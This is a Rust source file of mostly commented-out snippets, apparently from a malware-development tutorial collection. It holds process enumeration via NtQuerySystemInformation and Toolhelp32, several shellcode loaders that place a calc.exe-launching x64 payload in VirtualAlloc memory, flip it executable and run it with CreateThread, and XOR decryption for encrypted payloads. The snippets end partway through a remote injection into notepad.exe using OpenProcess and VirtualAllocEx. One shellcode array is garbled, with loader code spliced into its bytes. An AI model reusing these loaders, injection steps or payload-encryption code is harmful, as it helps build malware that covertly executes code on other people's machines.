//         let mut return_len = 0;

//         let status = NtQuerySystemInformation(
//             SystemProcessInformation,
//             null_mut(),
//             0,
//             &mut return_len
//         );

//         if status != STATUS_INFO_LENGTH_MISMATCH{
//             println!("[+] Failed to get process information {:?}", status);
//             return
//         }

//         let status = NtQuerySystemInformation(
//             SystemProcessInformation,
//             buffer.as_mut_ptr() as *mut _,
//             return_len,
//         &mut return_len
//         );

//         if status != 0x00000000{
//             println!("[+] Failed to get Process Information !");
//             return
//         }
//         let mut offset:usize = 0;

//         loop{
//             let process_info = buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION;
//             let process_info = &*process_info; 

//             okey!("Process ID: {:?}",process_info.UniqueProcessId);
//             okey!("Image Name: {:#?}",String::from_utf8_lossy(process_info.ImageName.Buffer));
//             println!();

//             if process_info.NextEntryOffset == 0{
//                 break;
//             }
//             offset += process_info.NextEntryOffset as usize;
            
//         }
//     }
// }

// macro_rules! okey {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg, $($arg),*));
//     }
// }
// macro_rules! error {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[!] {}", format!($msg,$($arg),*));
//     };
// }


// use std::{ffi::CString, mem, ptr::null_mut};

// use winapi::um::{
//     errhandlingapi::GetLastError, handleapi::CloseHandle, processthreadsapi::{InitializeProcThreadAttributeList, OpenProcess, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFOA}, tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS
// }, winnt::PROCESS_ALL_ACCESS};
// use windows::Win32::System::Memory::{GetProcessHeap, HeapAlloc};
// use winapi::um::winbase::STARTUPINFOEXA;



// fn get_pid(process_name: &str) -> u32{
//     unsafe{
//         let mut pe: PROCESSENTRY32 = std::mem::zeroed();
//         pe.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

//         let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//         if snap.is_null(){
//             error!("Error while snapshoting processes : Error : {}",GetLastError());
//             std::process::exit(0);
//         }

//         let mut pid = 0;

//         let mut result = Process32First(snap, &mut pe) != 0;

//         while result{

//             let exe_file = CString::from_vec_unchecked(pe.szExeFile
//                 .iter()
//                 .map(|&file| file as u8)
//                 .take_while(|&c| c!=0)
//                 .collect::<Vec<u8>>(),
//             );

//             if exe_file.to_str().unwrap() == process_name {
//                 pid = pe.th32ProcessID;
//                 break;
//             }
//             result = Process32Next(snap, &mut pe) !=0;
//         }

//         if pid == 0{
//             error!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
//             std::process::exit(0);
//         }

//         CloseHandle(snap);
//         pid
//     }
// }

// fn main(){
//     // talking snapshot of all in the system.

//     let process_name = "explorer.exe";
//     let explorer_pid = get_pid(&process_name);
//     let notepad_pid = get_pid("notepad.exe");

//     unsafe{
//         let process = OpenProcess(PROCESS_ALL_ACCESS, 
//             0, 
//             explorer_pid,
//         );
        
//         let mut si: STARTUPINFOA = std::mem::zeroed();
//         let mut st = 0;

//         // InitializeProcThreadAttributeList(lpAttributeList, dwAttributeCount, dwFlags, lpSize)


//     }
// }

/* 
Malware Basics: Allocating at Windows Memory via Rust Functions and Windows API'S ! 

For more codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
By: @5mukx

*/

// MANUAL MEMORY ALLOCATION WITHOUT [winapi] aka WINDOWS API.

/* 

use std::alloc::{alloc, dealloc, Layout};
use std::ptr;
use std::ffi::CString;

use std::ptr::copy_nonoverlapping;

fn main(){
    let size = 100;

    let layout = Layout::from_size_align(size, std::mem::align_of::<u8>()).unwrap();
    
    // Allocate memory with global Allocator 
    let p_addr = unsafe { alloc(layout)};

    unsafe{
        if p_addr.is_null(){
            // filling the allocated memory with 0 .
            ptr::write_bytes(p_addr, 0, size);
            // Using CString, An C-compatible, nul-terminated string with no nul bytes in the middle.

            let string = CString::new("Maldev hits diffrerent").expect("Error while creating cstring");
            
            // copy_nonoverlapping is semantically equivalent to C's memcpy but with the argument order swapped
                copy_nonoverlapping(string.as_ptr(), p_addr as *mut i8, string.as_bytes().len());

                let content = std::slice::from_raw_parts(p_addr, string.as_bytes().len());

                println!("[+] Memory Content: {:?}",content);
                
                println!("[+] Deallocating Mem contnet");
                dealloc(p_addr, layout);
            } else {
                println!("[-] Failed to allocate memory");
            }
        }
}

*/

// MEMORY ALLOCATION USING [winapi]

/*
Make sure you have include these dependencies on Cargo.toml file !

[dependencies]
winapi = { version = "0.3", features = ["minwindef", "winbase"] }
*/



// use winapi::um::heapapi::{GetProcessHeap, HeapAlloc, HeapFree};
// use std::slice::from_raw_parts;
// fn main(){
//     unsafe{
//         let heap = GetProcessHeap();
//         if heap.is_null(){
//             println!("[-] Failed to get process heap");
//             return
//         }
        
//         // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
//         // 0x00000008 -> /. similar to winnt::HEAP_ZERO_MEMORY; 
//         let p_address = HeapAlloc(heap, 0x00000008, 100);

//         if p_address.is_null(){
//             println!("[-] Failed to allocate memory on the heap");
//             return
//         }

//         println!("[+] Base Address of Allocated memory: {:#?}",p_address);

//         let string = "Maldev hits different".as_ptr() as *const u8;


//         std::ptr::copy_nonoverlapping(string , p_address as *mut u8, 100);

//         let content = from_raw_parts(p_address as *const u8, 100);
        
//         println!("[+] Memory content: {:?}", content);

        
//         HeapFree(heap, 0, p_address);

//         println!("[+] Freed Allocated memory !");
//     }
// }

// struct Solution;
// impl Solution {
//     pub fn is_valid(s: String) -> bool {
//         let mut stack = Vec::new();
//         for i in s.chars(){
//             match i {
//                 '{' => stack.push('}'),
//                 '(' => stack.push(')'),
//                 '[' => stack.push(']'),
//                 '}'|')'|']' if Some(i) != stack.pop() => return false,
//                 _ => (),
//             }
//         }
//         return stack.is_empty();
//     }
// }

// fn main(){
//     let que = "()".to_string();
//     let que1 = "(]".to_string();

//     println!("{}",Solution::is_valid(que));
//     println!("{}",Solution::is_valid(que1));

// }

// use std::{mem::transmute, ptr::null_mut};
// use winapi::{
//     ctypes::c_void, 
//     um::{
//         errhandlingapi::GetLastError,
//         memoryapi::{VirtualAlloc, VirtualProtect}, 
//         processthreadsapi::CreateThread, 
//         synchapi::WaitForSingleObject, 
//         winnt::{RtlMoveMemory, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE
//         }
//     }
// };

// macro_rules! error {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[-] {}", format!($msg,$($arg),*));
//     };
// }

// macro_rules! okkie {
//     ($msg:expr, $($arg:expr), *) => {
//         println!("[+] {}", format!($msg,$($arg),*));
//     };
// }


// fn main(){
//     let shellcode: [i32; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//         0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//         0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
//         0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
//         0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
//         0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
//         0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
//         0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
//         0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
//         0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
//         0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
//         0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
//         0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
//         0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
//         0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
//         0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
//         0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
//         0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
//         0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
//         0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
//         0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
//         0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
//         0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
//         0x63,0x2e,0x65,0x78,0x65,0x00];

//     unsafe{
//         let protect:u32 = 0;
        
//         let alloc = VirtualAlloc(null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

//         if alloc.is_null(){
//             error!("Error while Allocating memory: {}",GetLastError());
//             return
//         }

//         okkie!("Allocated Memory: {:#?}",alloc);

//         // std::ptr::copy_nonoverlapping(shellcode.as_mut_ptr() as *mut c_void,alloc, shellcode.len());
//         RtlMoveMemory(alloc, shellcode.as_ptr() as *const c_void, shellcode.len());

//         // okkie!("Allocated MEM Region is :{:#?}",alloc_mem);

//         let buffer = VirtualProtect(alloc, shellcode.len() , PAGE_EXECUTE_READ , protect as *mut u32);
        
//         println!("{:?}",buffer);
//         if buffer !=0 {
//             let run = CreateThread(null_mut(), 0, transmute(shellcode.as_ptr()), null_mut(), 0, null_mut());
//             WaitForSingleObject(run,1);
//         }
//     }
// }

// use winapi::shared::minwindef::{DWORD, LPVOID};
// use winapi::shared::ntdef::{FALSE, HANDLE};
// use winapi::um::handleapi::CloseHandle;
// use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
// use winapi::um::minwinbase::LPTHREAD_START_ROUTINE;
// use winapi::um::processthreadsapi::CreateThread;
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winbase::{WAIT_FAILED, WAIT_OBJECT_0};
// use winapi::um::winnt::{RtlMoveMemory, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
// use std::ptr::null_mut;

// static SHELLCODE:[i32;276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//          0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//          0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
//          0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
//          0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
//          0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
//          0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
//          0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
//          0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
//          0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
//          0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
//          0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
//          0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
//          0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
//          0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
//          0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
//          0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
//          0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
//          0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
//          0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
//          0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
//          0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
//          0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
//          0x63,0x2e,0x65,0x78,0x65,0x00];

// fn main(){
//     let payload: LPVOID;
//     // let mut reserve: bool= false;
//     let mut th: HANDLE;
//     let mut oldprotect :DWORD= 0;

//     unsafe{
//         payload = VirtualAlloc(null_mut(), SHELLCODE.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
//         RtlMoveMemory(payload, SHELLCODE.as_ptr() as LPVOID, SHELLCODE.len());

//         let reserve = VirtualProtect(payload, SHELLCODE.len(), PAGE_EXECUTE_READ, &mut oldprotect);

//         if reserve != 0{
//             th = CreateThread(null_mut(), 0, std::mem::transmute(payload), null_mut(), 0, null_mut());
//             if th != null_mut(){
//                 WaitForSingleObject(th, 1);
//                 CloseHandle(th);
//             }
//         }         
//     }
// }

// use winapi::um::{handleapi::CloseHandle, memoryapi::{VirtualAlloc, VirtualProtect}, processthreadsapi::CreateThread, synchapi::WaitForSingleObject, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE}};
// use std::ptr::null_mut;

// fn main(){
//     let payload: [u8; 276] = 
//    [0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
//     0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
//     0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
//     0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
//     0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
//     0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
//     0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
//     0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
//     0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
//     0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
//     0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
//     0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
//     0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
//     0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
//     0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
//        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
//     0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
//     0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00];

//     let payload_mem = unsafe{
//   0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
//     0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
//     0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
//     0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
//     0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
//        VirtualAlloc(null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
//     };

//     println!("Allocation Address: {:#?}",payload_mem);

//     unsafe{
//         if !payload_mem.is_null(){
//             let dest_ptr = payload_mem as *mut u8;
//             std::ptr::copy_nonoverlapping(payload.as_ptr(), dest_ptr, payload.len());

//             let old_protect: u32= 0;
//             let rv = VirtualProtect(payload_mem, payload.len(), PAGE_EXECUTE_READ, old_protect as *mut u32);

//             println!("{:#?}",rv);

//             if rv != 0{
//                 let th: *mut winapi::ctypes::c_void = CreateThread(null_mut(), 0, Some(std::mem::transmute(payload_mem)), null_mut(),0, null_mut());
//                 println!("{:#?}",th);
//                 if !th.is_null(){
//                     println!("th is not null");
//                     WaitForSingleObject(th, 1);
//                     CloseHandle(th);
//                 }
//             }
//         } 
//     }
// }

// encryption methods !




// #[allow(unused_imports)]
// #[allow(unused_import_braces)]
// use std::include_bytes;
// use std::mem::transmute;
// use std::ptr::null_mut;
// use sysinfo::*;
// use winapi::um::processthreadsapi::CreateRemoteThread;
// use winapi::um::synchapi::WaitForSingleObject;
// use winapi::um::winbase::WAIT_FAILED;
// use winapi::um::winnt::PROCESS_ALL_ACCESS;
// // use winapi::shared::ntdef::FALSE; 
// use winapi::shared::minwindef::FALSE;
// // use winapi::um::processthreadsapi::OpenProcess;
// // // OR
// // use winapi::shared::minwindef::FALSE;
// use winapi::um::{
//     handleapi::CloseHandle, // If you want to free up , you can do it manually ! 
//     errhandlingapi::GetLastError,
//     winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE},
//     processthreadsapi::OpenProcess,
//     memoryapi::{WriteProcessMemory,VirtualAllocEx,VirtualProtectEx}};


// For Normal Functions !_! 

// fn xor_decrypt(data: &mut [u8], key: &[u8]){
//     let mut j = 0;
//     for i in 0..data.len(){
//         if j == key.len(){
//             j = 0;
//         }
//         data[i] ^= key[j];
//         j += 1;
//     }
// }


// fn xor_decrypt(data: &mut [u8], key: &[u8]){
//     let mut j = 0;
//     for i in 0..data.len(){
//         if j == key.len() -1 {
//             j = 0;
//         }
//         data[i] ^= key[j];
//         j += 1;
//     }
// }





// fn main() -> std::io::Result<()>{

    // ShellCode Link : https://github.com/peterferrie/win-exec-calc-shellcode/tree/master/build/bin
    // Download the shellcode and Execute from it 

    // paste your encrypted payload !
    // let mut shellcode:[u8; 503]  = [0x21, 0x53, 0xa6, 0x2c, 0xeb, 0x93, 0xaf, 0x8d, 0x8e, 0x88, 0x39, 0xf4, 0x74, 0x90, 0x8d, 0x87, 0x8e, 0x36, 0xc8, 0xca, 0x95, 0xcc, 0x5d, 0x6e, 0x1b, 0xb6, 0x5c, 0xc8, 0xbf, 0xd9, 0xa0, 0xc8, 0xa0, 0x7a, 0x77, 0x67, 0x78, 0x72, 0x7b, 0xda, 0xdb, 0xa0, 0xb7, 0x83, 0xe5, 0x60, 0x5b, 0x2f, 0x8d, 0x62, 0x2a, 0x39, 0x52, 0xfa, 0x21, 0x7b, 0xf2, 0x1b, 0xa2, 0x14, 0x70, 0x23, 0x2d, 0x73, 0xf2, 0x89, 0x2b, 0x58, 0x78, 0x0e, 0x2b, 0x26, 0xf9, 0x84, 0x00, 0x0a, 0x78, 0x83, 0xcc, 0x4c, 0x93, 0x4d, 0x50, 0x9b, 0x17, 0xbb, 0xd0, 0xa3, 0xea, 0x68, 0x63, 0x50, 0x78, 0xa8, 0x51, 0xa6, 0x16, 0x75, 0x56, 0x3e, 0x97, 0x07, 0xf2, 0x38, 0x91, 0x37, 0x5f, 0xbd, 0x02, 0xc5, 0xbc, 0x23, 0xfb, 0x26, 0x3d, 0xe4, 0xf4, 0x6c, 0xb4, 0x68, 0xfd, 0x6e, 0x73, 0xb7, 0xbf, 0xb0, 0x52, 0x11, 0xf4, 0x8b, 0x65, 0x94, 0x3c, 0xd9, 0x7a, 0xc8, 0xb5, 0x62, 0x7e, 0x1e, 0x4c, 0x25, 0x7b, 0x03, 0x1d, 0x85, 0x9d, 0x9d, 0xaf, 0x47, 0x63, 0x4a, 0xcf, 0x03, 0xed, 0x37, 0x2a, 0x0f, 0x13, 0x12, 0x5a, 0x7a, 0x12, 0xf6, 0xd4, 0x39, 0x12, 0x9f, 0xf5, 0xce, 0x32, 0xac, 0x89, 0x6c, 0xec, 0xad, 0x47, 0x9b, 0x29, 0x8c, 0x58, 0x78, 0xb3, 0x20, 0x42, 0xbe, 0x88, 0xc9, 0x68, 0x7b, 0xb0, 0x15, 0x35, 0xcf, 0xbe, 0x49, 0xf8, 0x18, 0xba, 0x9f, 0xf1, 0xd9, 0x62, 0xde, 0x2f, 0x4a, 0xe9, 0x57, 0x1f, 0xd9, 0xa6, 0x82, 0x82, 0x59, 0xb2, 0xbe, 0x7f, 0xb1, 0xc6, 0xe6, 0x84, 0x35, 0x14, 0x0e, 0x78, 0xbf, 0xcd, 0x41, 0x38, 0x25, 0xce, 0xa0, 0x15, 0xae, 0x0f, 0xae, 0x2e, 0x33, 0x4b, 0x1f, 0xba, 0xbb, 0xca, 0x04, 0xb0, 0x2f, 0xbf, 0x8e, 0x4e, 0xe1, 0xbd, 0x87, 0xbd, 0x0f, 0xff, 0x52, 0x9b, 0x92, 0x3e, 0x6b, 0x44, 0x5f, 0xa5, 0xc3, 0x23, 0x4d, 0x41, 0xd7, 0x5f, 0x45, 0xa3, 0xd2, 0x3d, 0x06, 0x0c, 0x00, 0xb7, 0xf7, 0xff, 0x7f, 0xea, 0xd7, 0xef, 0xea, 0xec, 0xf1, 0x11, 0x73, 0xea, 0x15, 0x4c, 0x97, 0xc7, 0xf4, 0xc9, 0xd7, 0xe2, 0x3b, 0x41, 0x61, 0x08, 0xe1, 0x0e, 0x99, 0xa3, 0x92, 0x22, 0x70, 0xff, 0x40, 0x19, 0x46, 0xcc, 0x2e, 0x8b, 0x07, 0x31, 0x5c, 0x03, 0xe9, 0x69, 0x58, 0xf8, 0x80, 0x67, 0x65, 0xa0, 0x57, 0x2f, 0xd8, 0x2e, 0xf8, 0xce, 0x97, 0xbf, 0x97, 0x50, 0xdd, 0x2f, 0xa6, 0xe1, 0x9f, 0x7f, 0x3b, 0xf8, 0x3a, 0xee, 0xc4, 0x68, 0x7c, 0xfe, 0x30, 0x6d, 0xe7, 0xa9, 0x50, 0x2e, 0x03, 0xd9, 0x30, 0x4c, 0xba, 0x4b, 0x20, 0x4f, 0xd4, 0x4c, 0xd1, 0xa6, 0x06, 0x61, 0x0f, 0x44, 0xd1, 0x0e, 0x53, 0x84, 0x02, 0x46, 0x5f, 0x24, 0x5f, 0xdf, 0x0c, 0xa5, 0x0b, 0x61, 0x37, 0xab, 0xb5, 0x36, 0x02, 0xa8, 0x0e, 0xce, 0x12, 0x14, 0x09, 0x67, 0x6a, 0xbf, 0x4a, 0x2a, 0xa3, 0xe8, 0x8c, 0x07, 0xaf, 0x23, 0x4b, 0xbb, 0x58, 0x13, 0xd6, 0x8e, 0xe5, 0x53, 0xe2, 0x89, 0xb9, 0xd1, 0x60, 0x8e, 0x44, 0xd2, 0xeb, 0x81, 0xb1, 0x77, 0xe5, 0x8c, 0x27, 0xc8, 0xdb, 0x43, 0x33, 0xc9, 0xae, 0xba, 0x62, 0x0e, 0x2e, 0x06, 0x1f, 0xff, 0x23, 0x2a, 0xdf, 0xd1, 0x5b, 0x7c, 0xc4, 0xed, 0xaa, 0xf0, 0x08, 0x2a, 0xe0, 0x10, 0x02, 0x15, 0xed, 0xfa, 0xd8, 0x22, 0xcf, 0x55, 0x08, 0x3d, 0xb0, 0x02, 0x76, 0x8a, 0xbe, 0x17, 0x68, 0xff, 0x48, 0x82, 0x8c, 0x5f, 0x76, 0x68, 0x4a, 0xa2, 0x69, 0x26, 0xa6, 0x5e, 0x91, 0xe2, 0xdd, 0xcc, 0x30, 0xc7, 0x62, 0x97, 0x15, 0x5a, 0xb7, 0xf4, 0x6e, 0xb5];
    // let mut shellcode: [u8; 98] = [0x3a, 0x34, 0x38, 0x31, 0x00, 0x1a, 0x33, 0x1a, 0x12, 0x16, 0x1d, 0x1a, 0x25, 0x26, 0x3a, 0x51, 0xa5, 0x1b, 0x3b, 0xf2, 0xbb, 0x30, 0x0a, 0xf6, 0x9e, 
    // 0xc8, 0x03, 0xf6, 0x9e, 0xc9, 0x2a, 0xc8, 0x06, 0xb2, 0xc0, 0x13, 0xf9, 0xa0, 0x8c, 0xc2, 0xb3, 0x1c, 0xd3, 0x8a, 0xb8, 0x1d, 0xfb, 0x83, 0xb1, 0xdf, 0xa6, 0x68, 0x14, 0xca, 0xbb, 0xba, 0xa9, 0x29, 0x80, 0x88, 0x28, 0xcc, 0xa9, 0x0d, 0x27, 0x8a, 0xa2, 0xf9, 0xc4, 0xdd, 0xe8, 0xc0, 0x42, 0x30, 0xda, 0xab, 0xb1, 0xf2, 0xae, 0x4b, 0x4e, 0x80, 0x13, 0xf4, 0xc3, 0x4b, 0x5d, 0x43, 0x1d, 0xf5, 0x40, 0x78, 0xa1, 0xe3, 0x9b, 0x8a, 0x98, 0x0f];
    
    


    // let shellcode: [u8; 216]  = [0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    // 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    // 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
    // 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    // 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    // 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    // 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    // 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    // 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
    // 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    // 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    // 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    // 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    // 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    // 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    // 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    // 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
    // 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00];  

  
    /*
        --> XOR Decrypt 
    */

    // let secrect_key = "iamafuckingnerd";

    // xor_decrypt(&mut shellcode, secrect_key.as_bytes());


//     let size = shellcode.len();
//     let mut system = System::new();
//     system.refresh_processes();
//     println!("{:?}", shellcode);

//     let pid = system
//         .processes_by_name("notepad.exe")
//         .next()
//         .expect("[-] No Process")
//         .pid()
//         .as_u32();

//     unsafe{
//         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
//         if handle == null_mut(){
//             panic!("Failed to Get OpenProcess: {}",GetLastError());
//         }
//         let address = VirtualAllocEx(handle,null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
//         if address.is_null(){
//             panic!("[-] Failed to Get Address: {}", GetLastError());
//         }
